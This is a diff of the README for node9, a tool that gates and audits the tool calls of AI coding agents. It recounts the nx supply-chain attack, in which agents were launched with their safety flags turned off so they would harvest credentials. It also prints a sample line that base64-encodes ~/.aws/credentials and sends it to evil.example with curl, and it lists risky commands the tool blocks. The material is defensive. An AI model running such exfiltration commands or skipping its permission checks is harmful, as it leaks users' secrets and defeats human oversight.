@@ -1,5 +1,6 @@
-<h1 align="center">🛡️ Node9</h1>
-<p align="center"><strong>What did your AI agent actually do? Find out.</strong></p>
+<h1 align="center">🛡️ node9</h1>
+<p align="center">IAM for your AI agents</p>
+<p align="center"><strong>Your AI agents can reach Slack, GitHub, email, and your database.<br />node9 decides what they may do with each one.</strong></p>
 <p align="center">
   <a href="https://www.npmjs.com/package/node9-ai"><img src="https://img.shields.io/npm/v/node9-ai.svg" alt="npm version" /></a>
   <a href="https://www.npmjs.com/package/node9-ai"><img src="https://img.shields.io/npm/dm/node9-ai.svg" alt="monthly downloads" /></a>
@@ -10,19 +11,71 @@
   <a href="https://github.com/node9-ai/node9-proxy/blob/main/.github/workflows/agent-security.yml"><img src="https://img.shields.io/badge/node9-self--scanned-a855f7?style=flat&labelColor=%231A1A2E&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNCAxNCI+PHBhdGggZmlsbD0iI0Y1RTlGRiIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik03IDAuNCAxLjYgMi41djQuMmMwIDMuMSAyLjMgNS42IDUuNCA2LjkgMy4xLTEuMyA1LjQtMy44IDUuNC02LjlWMi41TDcgMC40Wm0wIDEuNSAzLjkgMS41djMuM2MwIDIuMy0xLjYgNC4yLTMuOSA1LjMtMi4zLTEuMS0zLjktMy0zLjktNS4zVjMuNEw3IDEuOVptMCAyLjJhMS45IDEuOSAwIDAgMC0xIDMuNXYxLjZoMlY3LjZhMS45IDEuOSAwIDAgMC0xLTMuNVoiLz48L3N2Zz4K" alt="node9 self-scanned" /></a>
 </p>
 
-Node9 sits between your AI agent and the tools it can use — **discover** what it's already been doing, **protect** against risky actions in real time, and **review** what happened over any time window.
+## The problem
+
+In August 2025, compromised releases of the
+[`nx` build tool](https://github.com/advisories/GHSA-cxm3-wv7p-598c) shipped a post-install
+script that looked for AI coding agents already installed on the developer's machine, then ran
+them with their own safety flags turned off (`--dangerously-skip-permissions`, `--yolo`,
+`--trust-all-tools`) to enumerate SSH keys, cloud credentials and wallet files and write the list
+to disk. The script pushed the results to public repositories inside the victims' own GitHub
+accounts. More than a thousand valid GitHub tokens leaked, along with cloud credentials, npm
+tokens and roughly 20,000 files, from machines where the agent was doing exactly what it was
+told.
+
+The agent was not the attacker. The agent was the tool, and nothing stood between it and the
+files. node9's gate is not one of those flags: it runs in the hook, and an action it holds stays
+held even when the agent was started with permissions skipped.
+
+## What node9 does about it
+
+node9 sits between the agent and every tool it calls. The credential jail (`~/.ssh`, `~/.aws`,
+`.env` files, private keys) is on by default, and a read of one of those paths does not run.
+The agent is stopped, told why, and the decision comes to you:
+
+```text
+NODE9: Action blocked by security policy.
+INSTRUCTIONS:
+- Do NOT retry this exact command or attempt to bypass the rule.
+- Pivot to a non-destructive or read-only alternative.
+- Inform the user which security rule was triggered and ask how to proceed.
+```
+
+The command is parsed as a shell AST, not matched as text, so wrapping the read does not help.
+`echo $(cat ~/.aws/credentials | base64) | curl -d @- https://evil.example` is judged as a read
+of `~/.aws/credentials`, not as an `echo`.
+
+node9 is a **gate**. A held action does not run while it waits for you, and if you never answer
+it stays blocked. Everything else is allowed and written to the record.
+
+**What it does not do:** with egress control off, which is the default, a command that hands a
+file straight to the network, such as `curl -d @~/.aws/credentials`, is not treated as a read of
+that file. `node9 egress protect` gates destinations as well, and it covers shell commands only.
+
+## Verify it yourself
+
+```bash
+npx node9-ai scan                                       # every past agent session on this machine, ~10s, nothing uploads
+npx node9-ai scan-repo node9-ai/agent-security-demo    # a public repo with a real, hijackable agent workflow
+npx node9-ai posture                                    # this machine's exposure in 60s, nothing uploads
+gh attestation verify cli.js --repo node9-ai/node9-proxy  # every release artifact is signed
+```
+
+---
+
+Three jobs, one tool: **discover** what your agents have already done, **protect** against risky actions in real time, and **review** what happened over any time window.
 
 Works with **Claude Code · Codex CLI · Antigravity (agy) · GitHub Copilot CLI · Gemini CLI · Cursor · Windsurf · VSCode · Claude Desktop · Opencode · Pi · Hermes Agent · any MCP server**.
 
-## What Node9 does
+## What node9 does
 
-- 🔍 **Discover** — scan every past AI session for credential leaks, agent loops, blocked operations, and every secret on disk an agent could reach right now
-- 🛡 **Protect** — review or block risky commands before they run — `rm -rf`, `git push --force`, `DROP TABLE`, credential reads, `curl | bash`, AWS/GitHub/Stripe key leaks
-- 📊 **Review** — period-windowed report (today / week / month / 90 days) — cost per agent, top tools, shields fired, blast radius
+- 🔍 **Discover**: scan every past AI session for credential leaks, agent loops, blocked operations, and every secret on disk an agent could reach right now
+- 🛡 **Protect**: review or block risky commands before they run, such as `rm -rf`, `git push --force`, `DROP TABLE`, credential reads, `curl | bash`, and AWS/GitHub/Stripe key leaks
+- 📊 **Review**: a period-windowed report (today / week / month / 90 days) of cost per agent, top tools, shields fired, and blast radius
 
 ## Retrospective scan
 
-This is my own machine — 90 days while building Node9. Score 25/100, 5 credential files an AI agent could reach right now.
+This is my own machine, 90 days while building node9. Score 25/100, 5 credential files an AI agent could reach right now.
 
 ```bash
 npx node9-ai scan   # before installation, runs in ~10s, nothing uploads
@@ -30,19 +83,19 @@ node9 scan          # after installation, same output
 ```
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/7c5b30f1-1ca1-40b4-bfd5-d6671002e98e" width="720" alt="Node9 scan scorecard" />
+  <img src="https://github.com/user-attachments/assets/7c5b30f1-1ca1-40b4-bfd5-d6671002e98e" width="720" alt="node9 scan scorecard" />
 </p>
 
 ## Security posture scorecard
 
-`node9 posture` grades how exposed this machine is to a compromised agent — isolation, egress, secrets on disk, supply chain, privilege — and hands you the exact command to fix each finding.
+`node9 posture` grades how exposed this machine is to a compromised agent across isolation, egress, secrets on disk, supply chain, and privilege, and hands you the exact command to fix each finding.
 
 ```bash
 node9 posture          # scorecard with the #1 risk and a fix for every finding
 node9 posture --ship   # send a redacted snapshot to your node9 dashboard (fleet view)
 ```
 
-Findings are grouped by **who can fix them**: 🔒 the ones node9 reduces (just run the command) and 🧱 the ones only you can. Each carries a plain-language what / why / who and a real remediation — e.g. the "agent runs unsandboxed on the host" finding points straight at `node9 sandbox run` (below).
+Findings are grouped by **who can fix them**: 🔒 the ones node9 reduces (just run the command) and 🧱 the ones only you can. Each carries a plain-language what / why / who and a real remediation. For example, the "agent runs unsandboxed on the host" finding points straight at `node9 sandbox run` (below).
 
 ```text
 🛡️  Node9 Posture — agent on this host        Score: 100/100  (Good)
@@ -70,13 +123,13 @@ Findings are grouped by **who can fix them**: 🔒 the ones node9 reduces (just 
   Track this across your fleet & keep it green → node9.ai
 ```
 
-## Scan a repo — agent-CI security
+## Scan a repo: agent-CI security
 
-`node9 scan-repo` checks any repo (or a local folder) for ways an AI agent wired into GitHub Actions could be **hijacked by an outsider** — injectable workflows, agent-reachable secrets, unpinned MCP servers, over-broad agent config, and poisoned instruction files. Static and parse-only: it reads only committed config, never executes repo code. No install or token needed for public repos.
+`node9 scan-repo` checks any repo (or a local folder) for ways an AI agent wired into GitHub Actions could be **hijacked by an outsider**: injectable workflows, agent-reachable secrets, unpinned MCP servers, over-broad agent config, and poisoned instruction files. Static and parse-only: it reads only committed config, never executes repo code. No install or token needed for public repos.
 
 ```bash
 npx node9-ai scan-repo <owner/repo>   # any public repo, no install
-node9 scan-repo .                      # a local checkout — no network
+node9 scan-repo .                      # a local checkout, no network
 node9 scan-repo <owner/repo> --json    # machine-readable
 ```
 
@@ -101,12 +154,12 @@ What it checks:
 | Check    | Flags                                                                            |
 | -------- | -------------------------------------------------------------------------------- |
 | **CI-1** | committed agent config that pre-authorizes broad tools or runs remote hooks      |
-| **CI-2** | injectable agent workflows — an outsider can trigger the agent and hijack it     |
+| **CI-2** | injectable agent workflows: an outsider can trigger the agent and hijack it      |
 | **CI-3** | unpinned / `@latest` MCP servers or inline credentials (supply chain)            |
 | **CI-4** | secrets an injected agent could exfiltrate                                       |
 | **CI-6** | poisoned or dangerous instructions in `CLAUDE.md` / `AGENTS.md` / `.cursorrules` |
 
-**Gate every PR** — the same engine as a GitHub Action, so a hijackable config can't get merged:
+**Gate every PR.** The same engine runs as a GitHub Action, so a hijackable config can't get merged:
 
 ```yaml
 # .github/workflows/agent-security.yml
@@ -128,20 +181,20 @@ Running it? Add the **[`scanned by node9` badge](https://node9.ai/docs/badges)**
 ## Live monitoring
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/4661da97-c174-4bae-ae54-4c52a1d69213" width="720" alt="Node9 monitor dashboard" />
+  <img src="https://github.com/user-attachments/assets/4661da97-c174-4bae-ae54-4c52a1d69213" width="720" alt="node9 monitor dashboard" />
 </p>
 
 `node9 monitor` opens an interactive terminal dashboard with two views:
 
-- **`[1]` Realtime** — live activity, approvals, security alerts, current risk score
-- **`[2]` Report** — period-windowed summary: cost, top tools, shields fired, blast radius
+- **`[1]` Realtime**: live activity, approvals, security alerts, current risk score
+- **`[2]` Report**: period-windowed summary of cost, top tools, shields fired, blast radius
 
 ## Report
 
-Press `[2]` in monitor for a period-windowed summary. Toggle the window with `[T]oday` · `[W]eek` · `[M]onth` · `[N]inety` — same panels as the scan above, driven by your post-install audit log.
+Press `[2]` in monitor for a period-windowed summary. Toggle the window with `[T]oday` · `[W]eek` · `[M]onth` · `[N]inety`. Same panels as the scan above, driven by your post-install audit log.
 
 <p align="center">
-  <img src="https://github.com/user-attachments/assets/66c02a72-e477-443d-807f-d65a21d096cd" width="720" alt="Node9 monitor [2] Report" />
+  <img src="https://github.com/user-attachments/assets/66c02a72-e477-443d-807f-d65a21d096cd" width="720" alt="node9 monitor [2] Report" />
 </p>
 
 ```bash
@@ -179,42 +232,39 @@ Mission Control, so the dashboard stays empty.
 `node9 logout` disconnects a machine again. It revokes that machine's key;
 local enforcement keeps running.
 
-## Shields — curated rule packs
+## Shields and apps
 
-Each shield is a curated rule set for a service or domain. Enable only what you need.
+A **shield** is a curated rule pack for a service an agent touches: Postgres, MongoDB, Redis,
+AWS, Kubernetes, Docker, GitHub, the shell, the filesystem, and the credential jail. Three of
+them, `project-jail`, `bash-safe` and `filesystem`, are on after `node9 init`. The rest you
+enable per service. Each shield mixes hard blocks with actions that come to you for review, and
+the docs say which is which, rule by rule.
 
-| Shield            | What it catches                                                                | Enable                                |
-| ----------------- | ------------------------------------------------------------------------------ | ------------------------------------- |
-| `project-jail`    | Blocks reads of `~/.ssh`, `~/.aws`, `.env`, credentials via Bash and Read tool | `node9 shield enable project-jail`    |
-| `bash-safe`       | `curl \| bash`, `rm -rf /`, disk overwrite, `eval` of remote                   | `node9 shield enable bash-safe`       |
-| `postgres`        | `DROP TABLE`, `TRUNCATE`, `DROP COLUMN`, `DELETE` without `WHERE`              | `node9 shield enable postgres`        |
-| `mongodb`         | `dropDatabase`, `drop()`, `deleteMany({})`, index drops                        | `node9 shield enable mongodb`         |
-| `redis`           | `FLUSHALL`, `FLUSHDB`, `CONFIG SET` on a live server                           | `node9 shield enable redis`           |
-| `aws`             | S3 delete, EC2 terminate, IAM changes, RDS destroy                             | `node9 shield enable aws`             |
-| `k8s`             | namespace delete, `helm uninstall`, cluster role wipes                         | `node9 shield enable k8s`             |
-| `docker`          | `system prune`, `volume prune`, `rm -f` containers                             | `node9 shield enable docker`          |
-| `github`          | `gh repo delete`, remote branch deletion, settings changes                     | `node9 shield enable github`          |
-| `filesystem`      | `chmod 777`, writes under `/etc/`, `/boot/`, `/usr/`                           | `node9 shield enable filesystem`      |
-| `mcp-tool-gating` | unapproved MCP tools silently activating new capabilities                      | `node9 shield enable mcp-tool-gating` |
+Any **MCP app** your agents use, Gmail, Slack, your database, is governed tool by tool from the
+Apps page in the dashboard: which tools an agent may call, which need review, which are off.
 
 ```bash
-node9 shield list    # show all shields + status
+node9 shield list                 # every shield and its status
+node9 shield enable postgres      # or enable it fleet-wide from the dashboard
 ```
 
-## Always on — no config needed
+The full list, with what each shield blocks and what it sends to review:
+**[node9.ai/docs/shields](https://node9.ai/docs/shields)**.
 
-- **Git** — catches `git push --force`, `git reset --hard`, `git clean -fd`
-- **SQL** — catches `DELETE` / `UPDATE` without `WHERE`, `DROP TABLE`, `TRUNCATE`
-- **Shell** — catches `curl | bash`, unauthorized `sudo`
-- **DLP** — flags AWS keys, GitHub tokens, Stripe keys, PEM private keys in any tool argument, file contents, or shell config (`~/.zshrc`, `~/.bashrc`)
-- **Response DLP** — background scanner reads Claude's conversation history and alerts you if Claude _wrote_ a secret in its response text
-- **Skills pinning** — SHA-256 verification of installed Claude skills / plugins between sessions
+## Always on, no config needed
 
-## Review prompts — approve inline, in your agent
+- **Git**: catches `git push --force`, `git reset --hard`, `git clean -fd`
+- **SQL**: catches `DELETE` / `UPDATE` without `WHERE`, `DROP TABLE`, `TRUNCATE`
+- **Shell**: catches `curl | bash`, unauthorized `sudo`
+- **DLP**: flags AWS keys, GitHub tokens, Stripe keys, PEM private keys in any tool argument, file contents, or shell config (`~/.zshrc`, `~/.bashrc`)
+- **Response DLP**: a background scanner reads Claude's conversation history and alerts you if Claude _wrote_ a secret in its response text
+- **Skills pinning**: SHA-256 verification of installed Claude skills / plugins between sessions
 
-When node9 flags an action for **review** (e.g. `git push --force`, a `DROP TABLE`), the approve/deny prompt renders **inline in the agent conversation** — no frozen session, no separate terminal, no hook-timeout race. node9 still runs the full evaluator and makes the decision; only the prompt _surface_ moves to the agent.
+## Review prompts: approve inline, in your agent
 
-- **On by default** for **Claude Code** and **GitHub Copilot CLI** — the agents whose hook contract honors a native `ask`. Every other agent (Codex, Gemini, Antigravity, Hermes, Cursor, OpenCode, Pi) uses node9's own approver.
+When node9 flags an action for **review** (e.g. `git push --force`, a `DROP TABLE`), the approve/deny prompt renders **inline in the agent conversation**: no frozen session, no separate terminal, no hook-timeout race. node9 still runs the full evaluator and makes the decision; only the prompt _surface_ moves to the agent.
+
+- **On by default** for **Claude Code** and **GitHub Copilot CLI**, the agents whose hook contract honors a native `ask`. Every other agent (Codex, Gemini, Antigravity, Hermes, Cursor, OpenCode, Pi) uses node9's own approver.
 - **Control it** with `reviewChannel` in `~/.node9/config.json` (or `--no-ask` on the hook):
 
 ```jsonc
@@ -225,28 +275,28 @@ When node9 flags an action for **review** (e.g. `git push --force`, a `DROP TABL
 }
 ```
 
-- **Team setups:** when a cloud/team approver is configured (`approvers.cloud: true`), reviews route to that approver instead — node9 won't let an inline self-approval bypass routed/second-party approval.
+- **Team setups:** when a cloud/team approver is configured (`approvers.cloud: true`), reviews route to that approver instead. node9 won't let an inline self-approval bypass routed/second-party approval.
 
-## Sandbox — run an agent in a jail
+## Sandbox: run an agent in a jail
 
-When watching isn't enough, **`node9 sandbox`** runs the agent inside a disposable container with a **kernel-enforced egress allowlist** and **scoped mounts** — while node9's hooks govern and audit every tool call _inside_ the box. The hard version of protection: the agent can only touch the folder you mount and reach the hosts you allow; everything else is dropped at the kernel.
+When watching isn't enough, **`node9 sandbox`** runs the agent inside a disposable container with a **kernel-enforced egress allowlist** and **scoped mounts**, while node9's hooks govern and audit every tool call _inside_ the box. The hard version of protection: the agent can only touch the folder you mount and reach the hosts you allow; everything else is dropped at the kernel.
 
 ```bash
 cd ~/my-project
-node9 sandbox new        # write node9.sandbox.yaml — what to mount + which hosts to allow
+node9 sandbox new        # write node9.sandbox.yaml: what to mount + which hosts to allow
 node9 sandbox run        # build + boot the jailed agent (your project at /workspace)
 node9 sandbox tail       # watch the agent's actions live, from the host
 ```
 
-- **Disposable** — the container is destroyed on exit; your project edits land on your real disk, nothing else survives.
-- **Same policy** — your existing shields / egress rules / approvals apply inside the box, streamed to the same audit log and dashboard.
-- **Closes the posture loop** — running it flips the Isolation / Egress findings green.
+- **Disposable**: the container is destroyed on exit; your project edits land on your real disk, nothing else survives.
+- **Same policy**: your existing shields / egress rules / approvals apply inside the box, streamed to the same audit log and dashboard.
+- **Closes the posture loop**: running it flips the Isolation / Egress findings green.
 
-Honest scope (Phase 1): single container, **Claude first** (Codex next); the agent still holds its _own_ credentials in the box (the egress wall confines them to the allowed hosts) — _"the agent never holds a secret"_ is the credential-broker phase on the roadmap. Requires Docker.
+Honest scope (Phase 1): single container, **Claude first** (Codex next); the agent still holds its _own_ credentials in the box (the kernel egress allowlist confines them to the allowed hosts). _"The agent never holds a secret"_ is the credential-broker phase on the roadmap. Requires Docker.
 
 ## MCP gateway
 
-Wrap any MCP server transparently. The agent sees the same server — Node9 intercepts every tool call.
+Wrap any MCP server transparently. The agent sees the same server. node9 intercepts every tool call.
 
 ```json
 {
@@ -259,18 +309,18 @@ Wrap any MCP server transparently. The agent sees the same server — Node9 inte
 }
 ```
 
-Or just run `node9 init` — it wraps your existing MCP servers automatically.
+Or just run `node9 init`, which wraps your existing MCP servers automatically.
 
 <details>
-<summary><strong>🔐 MCP tool pinning — rug-pull defense</strong></summary>
+<summary><strong>🔐 MCP tool pinning: rug-pull defense</strong></summary>
 
-MCP servers can change their tool definitions between sessions. A compromised or malicious server could silently add, remove, or modify tools after you first trusted it — a **rug pull** attack.
+MCP servers can change their tool definitions between sessions. A compromised or malicious server could silently add, remove, or modify tools after you first trusted it, a **rug pull** attack.
 
-Node9 pins tool definitions on first use:
+node9 pins tool definitions on first use:
 
-1. **First connection** — gateway records a SHA-256 hash of every tool's name, description, and schema
-2. **Subsequent connections** — hash is compared; if tools changed, the session is **quarantined** and every tool call is blocked until a human reviews and approves the change
-3. **Corrupt pin state** — fails closed (blocks), never silently re-trusts
+1. **First connection**: the gateway records a SHA-256 hash of every tool's name, description, and schema
+2. **Subsequent connections**: the hash is compared; if tools changed, the session is **quarantined** and every tool call is blocked until a human reviews and approves the change
+3. **Corrupt pin state**: fails closed (blocks), never silently re-trusts
 
 ```bash
 node9 mcp pin list                # show all pinned servers and hashes
@@ -284,13 +334,13 @@ node9 mcp pin reset               # clear all pins
 
 Beyond the three flow commands above (`scan` / `monitor` / `report`):
 
-| Command          | What it shows                                             | When to use                             |
-| ---------------- | --------------------------------------------------------- | --------------------------------------- |
-| `node9 blast`    | What an AI agent can reach right now — files, creds, env  | First thing to run on any machine       |
-| `node9 tail`     | Live stream of every tool call (text-only, no TUI)        | Piping into other tools, CI, logs       |
-| `node9 sessions` | Session history with prompt, tool trace, and cost         | Reviewing a handoff or past work        |
-| `node9 dlp`      | Credential-leak findings in Claude response text          | Any time a DLP desktop alert fires      |
-| `node9 mask`     | Redact plaintext secrets from local session history files | After a DLP finding — cleans local disk |
+| Command          | What it shows                                             | When to use                            |
+| ---------------- | --------------------------------------------------------- | -------------------------------------- |
+| `node9 blast`    | What an AI agent can reach right now: files, creds, env   | First thing to run on any machine      |
+| `node9 tail`     | Live stream of every tool call (text-only, no TUI)        | Piping into other tools, CI, logs      |
+| `node9 sessions` | Session history with prompt, tool trace, and cost         | Reviewing a handoff or past work       |
+| `node9 dlp`      | Credential-leak findings in Claude response text          | Any time a DLP desktop alert fires     |
+| `node9 mask`     | Redact plaintext secrets from local session history files | After a DLP finding, cleans local disk |
 
 Plus a **live HUD** in your Claude Code statusline:
 
@@ -300,25 +350,25 @@ Plus a **live HUD** in your Claude Code statusline:
 🗂 2 CLAUDE.md | 8 rules | 3 MCPs | 4 hooks
 ```
 
-## Reading the data — what the numbers mean
+## Reading the data: what the numbers mean
 
-Node9 surfaces the signal. Here are the patterns worth knowing:
+node9 surfaces the signal. Here are the patterns worth knowing:
 
-| Signal                                         | Likely meaning                                                                                     |
-| ---------------------------------------------- | -------------------------------------------------------------------------------------------------- |
-| `Would have blocked` ≥ 5 in a week             | Agent is attempting high-impact ops; shields are worth reviewing                                   |
-| Single `review-git-push` rule >50% of findings | Your own rule is firing as intended — not a risk, just supervision                                 |
-| DLP finding in `user-prompt` tool              | You pasted a secret into your own prompt — rotate the key                                          |
-| Agent Loop ×50+ on same file                   | Agent stuck in edit/test/fix cycle — check context or slow down                                    |
-| MCP tool pin mismatch                          | Server changed its tools — review before re-trusting                                               |
-| Large MCP response warning                     | That server is inflating your context window for every subsequent turn                             |
-| `Response DLP` alert                           | Claude wrote a secret in its response text — not blocked, rotate immediately                       |
-| DLP finding in `tool-result`                   | Claude read a file containing a secret (`.env`, credentials) — rotate the key and run `node9 mask` |
-| DLP finding in `[Shell]`                       | Plaintext secret in `~/.zshrc` or `~/.bashrc` — every AI session can see it                        |
+| Signal                                         | Likely meaning                                                                                    |
+| ---------------------------------------------- | ------------------------------------------------------------------------------------------------- |
+| `Would have blocked` ≥ 5 in a week             | Agent is attempting high-impact ops; shields are worth reviewing                                  |
+| Single `review-git-push` rule >50% of findings | Your own rule is firing as intended: not a risk, just supervision                                 |
+| DLP finding in `user-prompt` tool              | You pasted a secret into your own prompt. Rotate the key                                          |
+| Agent Loop ×50+ on same file                   | Agent stuck in an edit/test/fix cycle. Check context or slow down                                 |
+| MCP tool pin mismatch                          | Server changed its tools. Review before re-trusting                                               |
+| Large MCP response warning                     | That server is inflating your context window for every subsequent turn                            |
+| `Response DLP` alert                           | Claude wrote a secret in its response text. Not blocked, rotate immediately                       |
+| DLP finding in `tool-result`                   | Claude read a file containing a secret (`.env`, credentials). Rotate the key and run `node9 mask` |
+| DLP finding in `[Shell]`                       | Plaintext secret in `~/.zshrc` or `~/.bashrc`. Every AI session can see it                        |
 
 One-off signals are normal; persistent patterns are what you act on.
 
-## Python SDK — govern any Python agent
+## Python SDK: govern any Python agent
 
 ```python
 from node9 import configure, protect
@@ -330,28 +380,43 @@ def run_command(cmd: str) -> str:
     ...
 ```
 
-**[Python SDK →](https://github.com/node9-ai/node9-python)** · **[CI code review agent example →](https://github.com/node9-ai/node9-pr-agent)**
+**[Python SDK →](https://github.com/node9-ai/node9-python)** · **[GitHub Action →](https://github.com/marketplace/actions/node9-agent-security)**
 
 ## Under the hood
 
-- **Scan** reads raw agent history from `~/.claude/projects/`, `~/.gemini/tmp/`, `~/.gemini/antigravity-*/brain/`, `~/.copilot/session-state/`, `~/.codex/sessions/` — no API calls, fully offline
+- **Scan** reads raw agent history from `~/.claude/projects/`, `~/.gemini/tmp/`, `~/.gemini/antigravity-*/brain/`, `~/.copilot/session-state/`, `~/.codex/sessions/`. No API calls, fully offline
 - **Runtime** intercepts tool calls via pre-execution hooks (Claude Code, Codex, Antigravity, GitHub Copilot CLI, Gemini CLI, Opencode, Pi) or via the MCP gateway (Cursor, Windsurf, VSCode, Claude Desktop). All decisions land in `~/.node9/audit.log` atomically.
 - **MCP gateway** is a stdio proxy; intercepts `tools/list` + `tools/call` JSON-RPC, forwards the rest
-- **Policy engine** uses [mvdan-sh](https://github.com/mvdan/sh) for bash AST analysis — defeats obfuscation via backslash escaping, variable substitution, eval of remote download
-- **Sandbox** generates a Dockerfile + entrypoint that seal an `ipset`/`iptables` deny-by-default egress wall, then drop to a non-root agent with node9's daemon + hooks running inside; only the agent's credential file is mounted, never your whole `~/.claude`
+- **Policy engine** uses [mvdan-sh](https://github.com/mvdan/sh) for bash AST analysis, which defeats obfuscation via backslash escaping, variable substitution, eval of remote download
+- **Sandbox** generates a Dockerfile + entrypoint that seal an `ipset`/`iptables` deny-by-default egress allowlist, then drop to a non-root agent with node9's daemon + hooks running inside; only the agent's credential file is mounted, never your whole `~/.claude`
+
+## Learn
+
+Background reading, written to stand on its own. Each page says what node9 does not cover.
+
+- **[What can a hijacked agent do?](https://node9.ai/learn/what-can-a-hijacked-agent-do)**: the blast radius of one compromised session
+- **[How an AI agent leaks a secret](https://node9.ai/learn/ai-agent-secret-exfiltration)**: the paths a credential actually takes out
+- **[Claude Code security](https://node9.ai/learn/claude-code-security)**: hooks, permission modes, and what they do not stop
+- **[MCP security](https://node9.ai/learn/mcp-security)**: the tool surface an MCP server opens
+- **[OWASP Agentic Top 10](https://node9.ai/learn/owasp-agentic-top-10)**: the list, mapped to real controls
+
+## Compare
+
+- **[node9 against the alternatives](https://node9.ai/compare)**: a matrix, including the rows where node9 scores worse
+- **[Per-agent coverage](https://node9.ai/agents)**: what is governed on each of the twelve supported agents
 
 ## Full docs
 
-Config reference, smart rules, stateful rules, trusted hosts, approval modes, CLI reference — at **[node9.ai/docs](https://node9.ai/docs)**.
+Config reference, smart rules, stateful rules, trusted hosts, approval modes, CLI reference, at **[node9.ai/docs](https://node9.ai/docs)**.
 
 ## Related projects
 
-- **[node9-python](https://github.com/node9-ai/node9-python)** — Python SDK
-- **[node9-pr-agent](https://github.com/node9-ai/node9-pr-agent)** — GitHub Action that reviews PRs through Node9
+- **[node9-python](https://github.com/node9-ai/node9-python)**: Python SDK
+- **[node9 Agent Security](https://github.com/marketplace/actions/node9-agent-security)**: the GitHub Action, `uses: node9-ai/node9-proxy@v2`, gates every PR with the same engine
 
 ## Enterprise
 
-**Node9 Pro** adds governance locking, SAML/SSO, central audit export, and VPC deployment. See [node9.ai](https://node9.ai).
+**node9 Pro** adds governance locking, SAML/SSO, central audit export, and VPC deployment. See [node9.ai](https://node9.ai).
 
 ## License
 
